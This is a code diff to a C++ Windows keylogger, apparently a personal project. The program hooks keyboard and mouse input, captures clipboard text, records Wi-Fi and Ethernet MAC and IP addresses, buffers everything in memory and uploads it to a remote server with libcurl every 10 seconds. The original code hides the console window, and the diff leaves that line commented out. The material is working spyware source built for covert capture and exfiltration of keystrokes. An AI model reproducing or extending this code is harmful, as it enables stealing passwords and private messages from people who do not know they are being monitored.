@@ -18,9 +18,13 @@
 #pragma comment(lib, "curl/libcurl_a.lib")
 #endif
 
+#pragma comment(lib, "normaliz.lib") // normaliz.dll windows' library
 #pragma comment(lib, "user32.lib") // user32.dll windows' library
 #pragma comment(lib, "ws2_32.lib") // ws2_32.dll windows' library
 #pragma comment(lib, "iphlpapi.lib") // iphlpapi.dll windows' library
+#pragma comment(lib, "advapi32.lib") // advapi32.dll windows' library
+#pragma comment(lib, "crypt32.lib") // crypt32.dll windows' library
+#pragma comment(lib, "wldap32.lib") // wldap32.dll windows' library
 
 #define VK_0	0x30	// '0'
 #define VK_1	0x31	// '1'
@@ -77,7 +81,7 @@ char tempFolderPath[MAX_PATH]; // istancing a char array to memorize the TempFol
 DWORD result = GetTempPathA(MAX_PATH, tempFolderPath); // getting the TempFolder Path due to windows' function
 const std::string FilePath = (std::string)tempFolderPath + "logs.txt"; // setting the path of where i'm going to save the key pressed
 
-const std::chrono::seconds waitTime = std::chrono::seconds(int(30)); // seconds -> 15 minutes
+const std::chrono::seconds waitTime = std::chrono::seconds(int(10)); // seconds -> 15 minutes
 
 std::string clipBoardLastSave = ""; // saving the text in the windows' clipBoard
 std::string contentFile = ""; // save everything of what is been writing down
@@ -221,7 +225,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 				message = "\"";
 				break;
 			case VK_3: // £
-				message = "£";
+				message = "|£156|";
 				break;
 			case VK_4: // $
 				message = "$";
@@ -242,7 +246,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 				message = ")";
 				break;
 			case VK_SC_E: // é
-				message = "é";
+				message = "|é130|";
 				break;
 			case VK_OEM_PLUS: // 'SHIFT' + '+' = '*'
 				message = "*";
@@ -257,10 +261,10 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 				message = ":";
 				break;
 			case VK_SC_U: // §
-				message = "§";
+				message = "|§21|";
 				break;
 			case VK_SC_O: // ç
-				message = "ç";
+				message = "|ç135|";
 				break;
 			case VK_APOSTROPHE: // ?
 				message = "?";
@@ -272,7 +276,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 				message = "^";
 				break;
 			case VK_SC_A: // °
-				message = "°";
+				message = "|°167|";
 				break;
 			}
 		}
@@ -282,7 +286,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 			switch (vkCode)
 			{
 			case VK_SC_E: // è
-				message = "è";
+				message = "|è138|";
 				break;
 			case VK_OEM_PLUS: // +
 				message = "+";
@@ -297,10 +301,10 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 				message = ".";
 				break;
 			case VK_SC_U: // ù
-				message = "ù";
+				message = "|ù151|";
 				break;
 			case VK_SC_O: // ò
-				message = "ò";
+				message = "|ò149|";
 				break;
 			case VK_APOSTROPHE: // '
 				message = "'";
@@ -309,10 +313,10 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 				message = "\\";
 				break;
 			case VK_SC_I: // ì
-				message = "ì";
+				message = "|ì141|";
 				break;
 			case VK_SC_A: // à
-				message = "à";
+				message = "|à133|";
 				break;
 			}
 		}
@@ -454,13 +458,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 			|| vkCode == VK_CLEAR		// NUMBER FIVE OF NUMERIC KEYPAD WHEN "NUM_LOCK" IS DISABLED
 			) return CallNextHookEx(NULL, nCode, wParam, lParam);
 
-		// save the message in a file
-		std::ofstream file(FilePath, std::ios::app);
-		if (file.is_open()) file << message;
-		file.close();
-
-		std::cout << message;
-
+		contentFile.append(message);
 	}
 	// return control to the Operating System
 	return CallNextHookEx(NULL, nCode, wParam, lParam);
@@ -509,10 +507,7 @@ LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
 		else if (wParam == WM_MBUTTONDOWN)
 			message = "|M|";
 		checkPossibleCopy(message);
-		// save the message in a file
-		std::ofstream file(FilePath, std::ios::app);
-		if (file.is_open()) file << message;
-		file.close();
+		contentFile.append(message);
 	}
 
 	// Leaving the system its next job of the chain (the next hook)
@@ -566,9 +561,10 @@ static std::string StartString()
 	}
 	PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;
 	std::string macStr;
+	bool first = false, second = false;
 	while (pAdapterInfo) {
 		// Filtrare gli adattatori fisici e ignorare loopback e virtuali
-		if (pAdapterInfo->Type == IF_TYPE_IEEE80211 && !(pAdapterInfo->Index & 0x80000000)) {
+		if (pAdapterInfo->Type == IF_TYPE_IEEE80211 && !(pAdapterInfo->Index & 0x80000000) && !first) {
 			startString += "\nWireless Connection--";
 			MACToString(pAdapterInfo->Address, macStr);
 			startString += "\nAdapter Name: ";
@@ -578,9 +574,9 @@ static std::string StartString()
 			startString += "\nMAC Address: " + macStr + "\nIP Address: ";
 			startString.append(pAdapterInfo->IpAddressList.IpAddress.String);
 			startString += "\n";
-			break;
+			first = true;
 		}
-		if (pAdapterInfo->Type == MIB_IF_TYPE_ETHERNET && !(pAdapterInfo->Index & 0x80000000)) {
+		if (pAdapterInfo->Type == MIB_IF_TYPE_ETHERNET && !(pAdapterInfo->Index & 0x80000000) && !second) {
 			startString += "\nEthernet Connection (Physycal MAC address)--";
 			MACToString(pAdapterInfo->Address, macStr);
 			startString += "\nAdapter Name: ";
@@ -590,8 +586,9 @@ static std::string StartString()
 			startString += "\nMAC Address: " + macStr + "\nIP Address: ";
 			startString.append(pAdapterInfo->IpAddressList.IpAddress.String);
 			startString += "\n";
-			break;
+			second = true;
 		}
+		if (first && second) break;
 		pAdapterInfo = pAdapterInfo->Next;
 	}
 	if (macStr.empty()) {
@@ -626,6 +623,9 @@ void timeCheck() {
 		std::ofstream outputFile(FilePath);
 		if (outputFile.is_open()) outputFile << tmp;
 		outputFile.close();
+		std::ofstream giustoPerCapire("giustoPerCapire.txt");
+		if (giustoPerCapire.is_open()) giustoPerCapire << tmp;
+		giustoPerCapire.close();
 
 		// sending the file to the server
 		CURL* curl;
@@ -650,12 +650,13 @@ void timeCheck() {
 			// Effettua la richiesta
 			res = curl_easy_perform(curl);
 
-			if (res != CURLE_OK)
-				std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
+			/*if (res != CURLE_OK)
+				std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;*/
 
 			// Pulisce
 			curl_easy_cleanup(curl);
 			curl_formfree(formpost);
+			std::cout << "File inviato correttamente." << std::endl;
 		}
 		curl_global_cleanup();
 
@@ -669,7 +670,7 @@ int main()
 {
 	std::thread t(timeCheck); // istancing a thread
 
-	FreeConsole();
+	//FreeConsole(); // hiding the console
 
 	contentFile = StartString();
 	// istancing the hooks
